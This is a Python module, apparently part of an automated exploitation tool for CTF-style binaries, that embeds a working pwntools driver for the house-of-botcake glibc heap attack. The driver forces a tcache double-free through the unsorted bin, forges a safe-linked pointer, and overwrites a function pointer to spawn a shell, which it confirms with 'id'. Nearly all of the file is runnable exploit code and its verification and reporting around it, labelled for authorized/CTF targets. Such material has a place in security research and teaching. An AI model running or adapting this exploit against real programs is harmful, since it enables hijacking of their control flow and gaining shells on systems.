"""House-of-botcake, verified by execution (real glibc 2.29+ tcache).

House-of-botcake defeats the tcache double-free key check by routing the double-free through the
unsorted bin: fill the tcache, free two adjacent chunks so they CONSOLIDATE into one big unsorted
chunk, make room in the tcache, then free one of them AGAIN (now allowed -- its tcache key was
cleared when it passed through the unsorted bin). That chunk is now in the tcache AND inside the
big unsorted chunk. Allocating the big chunk yields a pointer that OVERLAPS the tcache chunk, so a
write forges its (safe-linked) fd -> the next allocations hand back an attacker-chosen address ->
write over a function pointer -> shell. Works on real modern glibc (verified on 2.39). The sandbox
runs with ASLR off, and the chunk table is a fixed symbol, so the heap address needed for
safe-linking is read from /proc/<pid>/mem (no info leak required). For AUTHORIZED / CTF targets."""
from __future__ import annotations

from ._sandbox import elf_symbol_names, run_driver

_DRIVER = r'''
import sys, time
from pwn import ELF, context, p64, u64, process
name = sys.argv[1]
context.binary = elf = ELF(name, checksec=False); context.log_level = "error"; context.arch = "amd64"
if elf.bits != 64:
    print("NOT_APPLICABLE (botcake driver is x86-64)"); sys.exit(1)

sym = elf.symbols or {}
chunks = sym.get("chunks"); handler = sym.get("handler") or sym.get("fnptr"); win = sym.get("win")
if chunks is None or handler is None or win is None:
    print("NOT_APPLICABLE (no botcake menu shape: need chunks[]+handler+win symbols)"); sys.exit(1)

SZ = 0xf8                               # request -> 0x100 chunk (tcache bin)
io = process([name], aslr=False)        # ASLR off -> deterministic heap

def alloc(sz): io.send(b"\x01" + p64(sz)); time.sleep(0.008)
def free(i):   io.send(b"\x02" + bytes([i])); time.sleep(0.008)
def edit(i, d):io.send(b"\x03" + bytes([i]) + len(d).to_bytes(2, "little") + d); time.sleep(0.008)

try:
    for i in range(7): alloc(SZ)        # 0..6 fill
    alloc(SZ); alloc(SZ); alloc(SZ)     # 7 prev, 8 a, 9 guard
    for i in range(7): free(i)          # fill tcache[0x100]
    free(7)                             # prev -> unsorted
    free(8)                             # a -> consolidate backward -> 0x200 unsorted chunk
    alloc(SZ)                           # 10: pop one from tcache (make room)
    free(8)                             # double free: a -> tcache head (key cleared by unsorted)
    time.sleep(0.04)
    with open("/proc/%d/mem" % io.pid, "rb", 0) as mem:
        mem.seek(chunks + 8 * 8); a = u64(mem.read(8))
    mangled = handler ^ (a >> 12)       # safe-linking (glibc >= 2.32)
    alloc(0x108)                        # 11 (d): carve from unsorted, OVERLAPS a
    edit(11, b"A" * 0xf0 + p64(0) + p64(0x101) + p64(mangled))   # forge a.fd = handler
    alloc(SZ)                           # 12: pops a
    alloc(SZ)                           # 13: pops handler -> chunks[13] = &handler
    edit(13, p64(win))                  # handler = win
    io.send(b"\x04")                    # call handler -> shell
    time.sleep(0.3)
    MARK = b"BINORACLE_BOTCAKE_PWNED"
    io.sendline(b"echo " + MARK + b"; id"); time.sleep(0.35)
    out = b""
    try: out = io.recvrepeat(1.1)
    except Exception: pass
    io.close()
    if MARK in out or b"uid=" in out:
        print("VERIFIED a=%#x handler=%#x win=%#x" % (a, handler, win)); sys.exit(0)
except Exception as e:
    try: io.close()
    except Exception: pass
    print("ERROR %s" % e.__class__.__name__); sys.exit(1)
print("NOT_VERIFIED")
sys.exit(1)
'''


def _botcake_applicable(binary: str) -> bool:
    """Chequeo barato: necesita un array chunks[], un function-pointer objetivo y win()."""
    names = elf_symbol_names(binary)
    if names is None:
        return True
    handler = any(n in names for n in ("handler", "fnptr"))
    return "chunks" in names and handler and "win" in names


def autobotcake(binary: str) -> dict:
    """House-of-botcake verificado por ejecucion (tcache de glibc real >=2.29). Necesita la forma de
    menu (chunks[]+handler+win). Docker o sandbox nativo (ASLR off); degrada limpio."""
    if not _botcake_applicable(binary):
        return {"ok": False, "note": "no aplicable (sin chunks[] + handler/fnptr + win)"}
    res = run_driver(binary, _DRIVER, ".binoracle_botcake.py")
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"house-of-botcake (double-free via unsorted -> overlap -> tcache poison): shell "
                   f"verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"house-of-botcake: no verificado ({eng}) (sin la forma de menu o timing)")
    return res


def render_botcake(r: dict) -> str:
    out = ["## Auto house-of-botcake (double-free -> overlap -> tcache poison, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- `{r['detail']}`")
    out.append("- " + r.get("note", ""))
    out.append("\n_nota: botcake esquiva el chequeo de doble-free del tcache enrutando por la unsorted "
               "bin; funciona en glibc moderno (verificado en 2.39)._")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
